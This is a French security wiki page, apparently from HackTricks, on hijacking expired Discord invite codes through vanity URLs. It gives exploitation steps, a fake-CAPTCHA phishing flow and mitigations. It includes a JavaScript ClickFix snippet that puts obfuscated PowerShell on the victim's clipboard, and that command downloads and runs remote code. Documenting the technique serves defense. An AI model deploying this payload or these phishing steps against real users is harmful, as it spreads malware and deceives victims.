# Détournement d'invitations Discord

{{#include ../../banners/hacktricks-training.md}}

Le détournement d'invitations Discord exploite les règles de réutilisation des liens vanity personnalisés : un code d'invitation temporaire expiré, ou un code permanent supprimé composé uniquement de lettres minuscules et de chiffres, peut être enregistré comme lien vanity sur un serveur ayant atteint le Level 3 Boost. Un lien vanity personnalisé peut également devenir disponible lorsque son serveur d'origine perd son Level 3 Boost ; pour une invitation temporaire comportant des majuscules, un attaquant peut préenregistrer la forme vanity en minuscules alors que l'invitation classique reste active, mais la redirection ne commence qu'après l'expiration de cette invitation.<sup>[[1]](#references)[[2]](#references)</sup>

## Types d'invitations et risque de détournement

Le risque observé diffère selon le type d'invitation :<sup>[[1]](#references)[[2]](#references)</sup>

| Type d'invitation           | Détournable ? | Condition / Commentaires                                                                                       |
|-----------------------|-------------|------------|
| Lien d'invitation temporaire | ✅          | Après son expiration, le code devient disponible et peut être réenregistré comme vanity URL par un serveur boosté. |
| Lien d'invitation permanent | ⚠️          | S'il est supprimé et composé uniquement de lettres minuscules et de chiffres, le code peut redevenir disponible.        |
| Lien vanity personnalisé    | ✅          | Si le serveur d'origine perd son Level 3 Boost, son invitation vanity devient disponible pour un nouvel enregistrement.    |

## Étapes d'exploitation

1. Reconnaissance
- Surveiller les sources publiques (forums, réseaux sociaux, canaux Telegram) à la recherche de liens d'invitation correspondant au modèle `discord.gg/{code}` ou `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
- Collecter les codes d'invitation intéressants (temporaires ou vanity).<sup>[[1]](#references)</sup>
2. Préenregistrement
- Créer ou utiliser un serveur Discord existant disposant des privilèges Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
- Dans **Paramètres du serveur → Vanity URL**, tenter d'attribuer le code d'invitation ciblé. S'il est accepté, le code est réservé par le serveur malveillant.<sup>[[1]](#references)</sup>
3. Activation du détournement
- Pour les invitations temporaires, attendre l'expiration de l'invitation d'origine (ou la supprimer manuellement si vous contrôlez la source).<sup>[[1]](#references)</sup>
- Pour les codes contenant des majuscules, la variante en minuscules peut être revendiquée immédiatement, bien que la redirection ne s'active qu'après l'expiration.<sup>[[1]](#references)</sup>
4. Redirection silencieuse
- Les utilisateurs visitant l'ancien lien sont redirigés de manière transparente vers le serveur contrôlé par l'attaquant une fois le détournement actif.<sup>[[1]](#references)</sup>

## Phishing via un serveur Discord

1. Restreindre les canaux du serveur afin que seul un canal **#verify** soit visible.<sup>[[1]](#references)</sup>
2. Déployer un bot (par exemple, **Safeguard#0786**) pour inviter les nouveaux arrivants à se vérifier via OAuth2.<sup>[[1]](#references)</sup>
3. Le bot redirige les utilisateurs vers un site de phishing (par exemple, `captchaguard.me`) sous couvert d'une étape de CAPTCHA ou de vérification.<sup>[[1]](#references)</sup>
4. Mettre en œuvre l'astuce UX **ClickFix** :<sup>[[1]](#references)</sup>
- Afficher un message indiquant que le CAPTCHA est défectueux.
- Guider les utilisateurs pour ouvrir la boîte de dialogue **Win+R**, coller une commande PowerShell préchargée et appuyer sur Entrée.

### Exemple d'injection dans le presse-papiers avec ClickFix

La campagne a utilisé JavaScript pour copier une commande PowerShell malveillante dans le presse-papiers :<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Cette approche évite les téléchargements directs de fichiers et exploite des éléments d’interface familiers afin de réduire la méfiance des utilisateurs.<sup>[[1]](#references)</sup>

## Mitigations

- Privilégiez les liens d’invitation permanents et assurez-vous que le code contient au moins une lettre majuscule ; les codes permanents supprimés contenant des lettres majuscules ne peuvent pas être réutilisés comme liens personnalisés.<sup>[[1]](#references)</sup>
- Faites régulièrement tourner les codes d’invitation et révoquez les anciens liens.
- Surveillez le statut des boosts du serveur Discord et les revendications d’URL personnalisées.<sup>[[1]](#references)[[2]](#references)</sup>
- Sensibilisez les utilisateurs à vérifier l’authenticité du serveur et à éviter d’exécuter des commandes collées depuis le presse-papiers.

## References

- [1] [De la confiance à la menace : des invitations Discord détournées utilisées pour diffuser des malwares en plusieurs étapes](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Lien d’invitation personnalisé – Assistance Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
